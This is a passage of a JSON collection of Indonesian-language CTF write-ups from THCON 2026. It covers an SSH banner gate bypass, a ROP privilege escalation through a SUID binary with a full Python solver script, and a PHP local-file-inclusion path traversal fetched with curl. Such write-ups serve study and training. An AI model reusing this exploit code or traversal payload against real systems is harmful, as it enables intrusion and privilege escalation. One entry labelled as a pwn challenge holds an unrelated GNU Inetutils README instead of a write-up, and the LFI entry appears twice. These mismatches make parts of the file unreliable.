        "content": "Kunci pentingnya ada di banner client SSH. Wrapper ternyata membolehkan koneksi lanjut kalau banner client mengandung pola yang cocok dengan `HTTP/1.0`.\n\nSupaya koneksi bisa masuk ke SSH asli, client harus mengirim banner seperti ini:\n\n\n\nSaya tidak pakai binary `ssh` biasa karena di environment ini tidak ada opsi mudah untuk mengganti banner. Saya pakai `paramiko` dan set:\n\n\n\nDengan itu wrapper lewat, lalu autentikasi SSH normal bisa jalan.",
        "code": "SSH-2.0-OpenSSH_9.6 HTTP/1.0"
      },
      {
        "title": "Initial access",
        "content": "Dari part sebelumnya saya sudah punya private key attacker. User yang valid ternyata:\n\n\n\nSetelah login berhasil, enumerasi cepat menunjukkan:\n\n\n\nDan di home directory ada binary yang sangat mencurigakan:\n\n\n\nPermission-nya:\n\n\n\nIni langsung jadi target utama karena:\n\n- owner `root`\n- bit SUID aktif\n- group `p4t4t0rz`, jadi user kita boleh execute",
        "code": "p4t4t0rz"
      },
      {
        "title": "Strategi exploit",
        "content": "Karena:\n\n- binary non-PIE\n- gadget sudah tersedia\n- path `/root/flag.txt` ada di section `.data`\n\nsaya pilih ROP sederhana berbasis fungsi impor PLT:\n\n1. `open(\"/root/flag.txt\", 0, 0)`\n2. pindahkan nilai return fd dari `rax` ke `rdi`\n3. `read(fd, .bss, 0x80)`\n4. `write(1, .bss, 0x80)`\n\nAlamat penting:\n\n- string `/root/flag.txt`: `0x404008`\n- `.bss`: `0x404020`\n- `pop rdi; ret`: `0x4012f1`\n- `pop rsi; ret`: `0x4012f3`\n- `pop rdx; ret`: `0x4012f5`\n- `mov rdi, rax; ret`: `0x40130a`\n- `open@plt`: `0x401180`\n- `read@plt`: `0x4010b0`\n- `write@plt`: `0x401080`"
      },
      {
        "title": "Menjalankan exploit",
        "content": "Flow interaksi dengan binary:\n\n1. pilih menu `1`\n2. tunggu prompt `Attacker IP`\n3. kirim payload overflow mentah\n4. tunggu prompt `Payload name`\n5. kirim string pendek biasa agar fungsi lanjut sampai `ret`\n\nSaat fungsi `cook_exploit()` selesai, RIP sudah mengambil ROP chain dan binary menulis isi flag ke stdout."
      },
      {
        "title": "File yang saya buat",
        "content": "- `exploit.py` untuk solve otomatis\n- `ssh_http10_proxy.py` untuk eksperimen bypass awal wrapper SSH\n\nProxy itu akhirnya tidak dipakai untuk solve final, karena pendekatan `paramiko` dengan custom banner lebih bersih."
      },
      {
        "title": "Cara pakai exploit",
        "content": "Aktifkan virtualenv:\n\n\n\nLalu jalankan:\n\n\n\nScript akan:\n\n1. retry koneksi sampai gate SSH terbuka\n2. login pakai key attacker\n3. jalankan binary SUID\n4. kirim ROP payload\n5. print flag",
        "code": "source /home/nata/ctf_env/bin/activate"
      },
      {
        "title": "Catatan akhir",
        "content": "Part ini bukan pwn jaringan murni dari service `nc`, tapi gabungan:\n\n- SSH gate bypass\n- reuse credential dari part sebelumnya\n- local privilege escalation lewat binary SUID yang vulnerable\n\nBegitu akses SSH didapat, exploitasinya sendiri cukup straight-forward karena binary memang sengaja menyediakan semua yang dibutuhkan untuk ROP yang bersih."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\nimport time\r\n\r\nimport paramiko\r\nfrom pwn import p64\r\n\r\n\r\nHOST = \"20.40.135.232\"\r\nPORT = 46809\r\nUSER = \"p4t4t0rz\"\r\nKEY_PATH = \"/home/nata/ctf/THCON2026/pwn/NocapJustRoot/part-2/id_p4t4t0rz\"\r\n\r\n\r\ndef recv_until(chan, marker: bytes, timeout: float = 5.0) -> bytes:\r\n    data = b\"\"\r\n    end = time.time() + timeout\r\n    while marker not in data and time.time() < end:\r\n        if chan.recv_ready():\r\n            data += chan.recv(4096)\r\n        else:\r\n            time.sleep(0.05)\r\n    return data\r\n\r\n\r\ndef build_payload() -> bytes:\r\n    payload = b\"A\" * 0x58\r\n\r\n    payload += p64(0x4012F1) + p64(0x404008)  # pop rdi ; \"/root/flag.txt\"\r\n    payload += p64(0x4012F3) + p64(0)         # pop rsi ; O_RDONLY\r\n    payload += p64(0x4012F5) + p64(0)         # pop rdx ; mode\r\n    payload += p64(0x401180)                  # open@plt\r\n\r\n    payload += p64(0x40130A)                  # mov rdi, rax ; ret\r\n    payload += p64(0x4012F3) + p64(0x404020)  # pop rsi ; .bss\r\n    payload += p64(0x4012F5) + p64(0x80)      # pop rdx ; size\r\n    payload += p64(0x4010B0)                  # read@plt\r\n\r\n    payload += p64(0x4012F1) + p64(1)         # pop rdi ; stdout\r\n    payload += p64(0x4012F3) + p64(0x404020)  # pop rsi ; .bss\r\n    payload += p64(0x4012F5) + p64(0x80)      # pop rdx ; size\r\n    payload += p64(0x401080)                  # write@plt\r\n\r\n    return payload\r\n\r\n\r\ndef connect():\r\n    key = paramiko.Ed25519Key(filename=KEY_PATH)\r\n    sock = socket.create_connection((HOST, PORT), timeout=8)\r\n    transport = paramiko.Transport(sock)\r\n    transport.local_version = \"SSH-2.0-OpenSSH_9.6 HTTP/1.0\"\r\n    transport.banner_timeout = 8\r\n    transport.handshake_timeout = 8\r\n    transport.start_client(timeout=8)\r\n    transport.auth_publickey(USER, key)\r\n    return sock, transport\r\n\r\n\r\ndef main() -> int:\r\n    payload = build_payload()\r\n\r\n    for attempt in range(12):\r\n        sock = None\r\n        transport = None\r\n        chan = None\r\n        try:\r\n            sock, transport = connect()\r\n            chan = transport.open_session()\r\n            chan.exec_command(\"/home/p4t4t0rz/skibidi_shell\")\r\n\r\n            recv_until(chan, b\"> \")\r\n            chan.send(b\"1\\n\")\r\n\r\n            recv_until(chan, b\"Attacker IP (Your Ohio IP): \")\r\n            chan.send(payload)\r\n\r\n            recv_until(chan, b\"Payload name (Sigma script): \")\r\n            chan.send(b\"x\\n\")\r\n\r\n            time.sleep(1)\r\n            out = b\"\"\r\n            end = time.time() + 5\r\n            while time.time() < end:\r\n                if chan.recv_ready():\r\n                    out += chan.recv(4096)\r\n                elif chan.exit_status_ready():\r\n                    break\r\n                else:\r\n                    time.sleep(0.05)\r\n\r\n            text = out.decode(\"utf-8\", \"replace\")\r\n            match = re.search(r\"(THC\\{[^\\r\\n]+\\}|FLAG\\{[^\\r\\n]+\\})\", text)\r\n            if match:\r\n                print(match.group(1))\r\n                return 0\r\n        except Exception:\r\n            time.sleep(6)\r\n        finally:\r\n            try:\r\n                chan.close()\r\n            except Exception:\r\n                pass\r\n            try:\r\n                transport.close()\r\n            except Exception:\r\n                pass\r\n            try:\r\n                sock.close()\r\n            except Exception:\r\n                pass\r\n\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "THC{S0m3_R0P_Ch41n_M4g1c}",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-web-authenticationcollapse-docker",
    "title": ": THCity: Authentication Collapse (part 1/2)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Writeup for challenge : THCity: Authentication Collapse (part 1/2)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Setelah melihat file yang diberikan (Docker environment), saya menemukan beberapa komponen utama:\n- `flag_server`: Server Apache dengan PHP yang menjalankan modul kustom `mod_auth_thcity.so`.\n- `sso_server`: Server SSO berbasis Node.js/Express.\n- `redis`: Tempat penyimpanan flag utama.\n\nDi file `flag_server/Dockerfile`, ada petunjuk menarik:\n> `# First flag is only in the compiled module \".so\"`\n\nIni artinya flag untuk part 1 disisipkan ke dalam binary modul Apache saat proses build.",
    "solution": [
      {
        "title": "2. Menemukan Vulnerability",
        "content": "Saya mengecek file `flag_server/image.php`:\n\nFile ini memiliki celah **Local File Inclusion (LFI)** karena parameter `img` tidak disanitasi. Saya bisa menggunakannya untuk membaca file apa pun di server.",
        "code": "$img = \"./images/\" . $_GET[\"img\"] ?? \"\";\nif(is_file($img)){\n  readfile($img);\n}"
      },
      {
        "title": "3. Eksploitasi",
        "content": "Karena saya butuh file `.so` modul Apache, saya mencoba menebak lokasinya. Biasanya di sistem Debian (seperti image `php:8.2-apache`), modul berada di `/usr/lib/apache2/modules/mod_auth_thcity.so`.\n\nSaya mendownload file tersebut menggunakan LFI:\n\n\nSetelah file berhasil didownload, saya mencari string flag di dalamnya:\n\n\nDitemukan flag:\n**THC{S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG}**",
        "code": "curl -s \"http://web-thcity-authentication-collapse.ctf.thcon.party:8888/image.php?img=../../../../../../usr/lib/apache2/modules/mod_auth_thcity.so\" --output mod_auth_thcity.so"
      },
      {
        "title": "4. Kesimpulan",
        "content": "Flag part 1 berhasil ditemukan di dalam binary modul Apache. Isi flag tersebut (`S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG`) memberikan petunjuk kuat bahwa part 2 akan melibatkan teknik SSRF melalui header injection dan HTTP pipelining pada modul tersebut untuk melewati otentikasi SSO dan mengakses Redis."
      }
    ],
    "terminalOutputs": [],
    "flag": "THC{S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG}",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-pwn-climbme",
    "title": "GNU inetutils - The GNU Networking Utilities",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "GNU Networking Utilities (Inetutils) are the traditional network\nclients, servers and utilities.  Included are ftp, hostname, ifconfig,\ninetd, logger, ping, rsh, rlogin, talk, telnet, tftp, syslogd,\ntraceroute, whois, and dnsdomainname.",
    "problemDescription": "GNU Networking Utilities (Inetutils) are the traditional network\nclients, servers and utilities.  Included are ftp, hostname, ifconfig,\ninetd, logger, ping, rsh, rlogin, talk, telnet, tftp, syslogd,\ntraceroute, whois, and dnsdomainname.\n\nSend bug reports to <bug-inetutils@gnu.org>.\n\n\nGNU Inetutils is licensed under the GNU General Public License version\n3.0 or later - see the file [COPYING](COPYING).\n\nThe manual (see doc/) is under the GNU Free Documentation License\nversion 1.3 or later, see [doc/fdl-1.3.texi](doc/fdl-1.3.texi).\n\nOther files are licensed as indicated in each file.  There may be\nexceptions to these general rules, see each file for precise\ninformation.\n\nFor any copyright year range specified as YYYY-ZZZZ in this package\nnote that the range specifies every single year in that closed\ninterval.\n\n\nSee the file INSTALL for generic installation instructions.\n\nThe file `paths` contains a list of all paths used by programs in this\ndistribution, and rules to find values for them.  To change a path\nPATH_FOO, you may either tell configure, by using\n`--with-path-foo=VALUE` (where VALUE may contain references to make\nvariables such as `$(bindir)`), or edit the `paths` file.  See further\nbelow for some important cases.\n\nIf you wish to build only the clients or only the servers, you may\nwish to use the `--disable-servers` or `--disable-clients` options\nwhen invoking `configure`.  You can also use `--enable-<program>` or\n`--disable-<program>` to control whether to build individual programs;\nif you explicitly specify whether to build a program, that will\noverride the values specified by `--disable-clients` or\n`--disable-servers`.\n\n\nThe individual utilities were originally derived from the 4.4BSDLite2\ndistribution.  Many features were integrated from NetBSD, OpenBSD,\nFreeBSD and GNU/Linux.\n\n\nIf you are the author of an awesome program and want to join us in\nwriting Free (libre) Software, please consider making it an official\nGNU program and become a GNU Maintainer.  You can find instructions on\nhow to do this here: http://www.gnu.org/help/evaluation\n\n\nSome words on testing are in order.  The three tests `ftp-localhost`,\n`ping`, and `traceroute`, all need to be run by root.  Several tests\nwill depend on infrastructure files in `/etc/`, but most tests will\ncomplain about their obvious needs.  Anyway, these dependencies are\nimportant whenever chrooted builds are conducted.\n\nAt the time of running a test, the shell variables TEST_IPV4 and\nTEST_IPV6 are influential.  Regard them as taking one of three values:\n`yes`, `no`, or `auto`.  When assigned the value `auto`, a small check\nat runtime will determine if the corresponding address family is available,\nand accordingly include it during test.  The values `yes`, and `no`,\ninclude or exclude the corresponding address family unconditionally.\n\nDuring configuration time, TEST_IPV# is essentially set to `auto`,\nexcept that `-enable-ipv#` assigns `yes`, and `--disable-ipv#` assigns\n`no` unconditionally.  Note however, that `--disable-ipv6` retains\nits property of removing all support for IPv6 in every executable,\nwhile `--disable-ipv4` only affects the testing target `check` and scripts.\n\nDuring chrooted tests, the runtime check for either family can be\nfooled, so setting `TEST_IPV6=yes` might be necessary.  On the other\nhand, chrooting similar to a FreeBSD jail, normally changes the address\nof `localhost`, so similar environments will need counteractions like\n`TARGET=10.0.6.1`.\n\n\nThe GNU whois client reads a whois-servers file to figure out which\nwhois server to use.  It won't always pick the best server;\nwhois.internic.net seems to know something about nic.ddn.mil, but the\nGNU whois client will use nic.ddn.mil to look up nic.ddn.mil if you\nuse the configuration file we supply.  Our configuration file probably\nalso does not have a complete list of whois servers; feel free to send\ninformation about additional whois servers to the bug reporting\naddress.\n\n\n - All of the r* client commands, `rcp`, `rlogin`, `rsh`, used to need\n   to be installed as setuid root to work correctly, since they use\n   privileged ports for communication.  However, some modern operating\n   systems now offer capabilities that avoid the need for setuid\n   settings, and this is accounted for in our present code.\n   CAP_NET_BIND_SERVICE and PRIV_NET_PRIVADDR are relevant for the\n   above three programs.\n\n - Similarly, `ping`, `ping6`, and `traceroute`, used to depend on\n   setuid installation, but also these are now content with\n   capabilities like CAP_NET_RAW, PRIV_NET_ICMPACCESS, and\n   PRIV_NET_RAWACCESS.\n\n\n - Some of the buildable executables depend critically on hard-coded\n   file locations for correct execution.  The most important, where\n   care is needed, are highlighted below.\n\n - `ftpd` needs access to several configuration files, in order that\n   all use cases be covered.  Both of PATH_FTPCHROOT and\n   PATH_FTPWELCOME are normally positioned correctly in sysconfdir by\n   default, whereas PATH_FTPUSERS usually is desired to state\n   `/etc/ftpusers`, but not all systems manage this.  Particular care\n   should be given to PATH_FTPLOGINMESG, since it defaults to\n   `/etc/motd`, which cannot be claimed as universally ideal.  A\n   sensible counter measure could be\n\n     `./configure --with-path-ftploginmesg=$(sysconfdir)/ftpmotd`\n\n   This would, however, complicate matter for chrooted users, so a\n   minor variation on the default could be preferable:\n\n     `./configure --with-path-ftploginmesg=/etc/ftpmotd`\n\n   Finally, the fall-back value `/etc/nologin` for PATH_NOLOGIN is in\n   effect for every systems lacking <paths.h>, but this sets the most\n   plausible location in any case.\n\n - `rcp` relies on PATH_RSH for proper hand-over.  Use the\n   configuration switch `--with-path-rsh=VALUE` for overriding the\n   detected value.  It should point to the intended location of `rsh`,\n   particularly when built with Kerberos support.\n\n - Similarly, `rsh` needs PATH_RLOGIN to locate `rlogin` for correct\n   delegation.  The switch `--with-path-rlogin=VALUE` may come handy\n   to ensure that `rsh` as well as `rlogin` offer identical Kerberos\n   support.\n\n\n - Non-Shishi Kerberos support does not build.  Patches welcome.\n\n - Shishi Kerberos support is only implemented for `rcp`, `rlogin`,\n   `rlogind`, `rsh`, `rshd`, `telnet`, and `telnetd`.\n\n - Not all utilities are Kerberized even when built with Kerberos\n   libraries, including `rcp` for non-Shishi Kerberos.\n\n - InetUtils does not build on HP-UX 11.00, Cygwin, Minix, MinGW,\n   MSCV, BeOS, Haiki (and probably other systems as well).  Patches\n   welcome.\n\n========================================================================\n\nCopyright (C) 1997-2025 Free Software Foundation, Inc.\n\nCopying and distribution of this file, with or without modification,\nare permitted in any medium without royalty provided the copyright\nnotice and this notice are preserved.  This file is offered as-is,\nwithout any warranty.",
    "tools": [],
    "analysis": "",
    "solution": [],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-web-authenticationcollapse",
    "title": "THCity: Authentication Collapse (part 1/2)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Writeup for challenge THCity: Authentication Collapse (part 1/2)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Setelah melihat file yang diberikan (Docker environment), saya menemukan beberapa komponen utama:\n- `flag_server`: Server Apache dengan PHP yang menjalankan modul kustom `mod_auth_thcity.so`.\n- `sso_server`: Server SSO berbasis Node.js/Express.\n- `redis`: Tempat penyimpanan flag utama.\n\nDi file `flag_server/Dockerfile`, ada petunjuk menarik:\n> `# First flag is only in the compiled module \".so\"`\n\nIni artinya flag untuk part 1 disisipkan ke dalam binary modul Apache saat proses build.",
    "solution": [
      {
        "title": "2. Menemukan Vulnerability",
        "content": "Saya mengecek file `flag_server/image.php`:\n\nFile ini memiliki celah **Local File Inclusion (LFI)** karena parameter `img` tidak disanitasi. Saya bisa menggunakannya untuk membaca file apa pun di server.",
        "code": "$img = \"./images/\" . $_GET[\"img\"] ?? \"\";\nif(is_file($img)){\n  readfile($img);\n}"
      },
      {
        "title": "3. Eksploitasi",
        "content": "Karena saya butuh file `.so` modul Apache, saya mencoba menebak lokasinya. Biasanya di sistem Debian (seperti image `php:8.2-apache`), modul berada di `/usr/lib/apache2/modules/mod_auth_thcity.so`.\n\nSaya mendownload file tersebut menggunakan LFI:\n\n\nSetelah file berhasil didownload, saya mencari string flag di dalamnya:\n\n\nDitemukan flag:\n**THC{S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG}**",
        "code": "curl -s \"http://web-thcity-authentication-collapse.ctf.thcon.party:8888/image.php?img=../../../../../../usr/lib/apache2/modules/mod_auth_thcity.so\" --output mod_auth_thcity.so"
      },
      {
        "title": "4. Kesimpulan",
        "content": "Flag part 1 berhasil ditemukan di dalam binary modul Apache. Isi flag tersebut (`S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG`) memberikan petunjuk kuat bahwa part 2 akan melibatkan teknik SSRF melalui header injection dan HTTP pipelining pada modul tersebut untuk melewati otentikasi SSO dan mengakses Redis."
      }
    ],
    "terminalOutputs": [],
    "flag": "THC{S5RF_W1th_h34d3Rs_0nly_4nd_p1pi3l1nInG}",
    "lessonsLearned": ""
  }
];
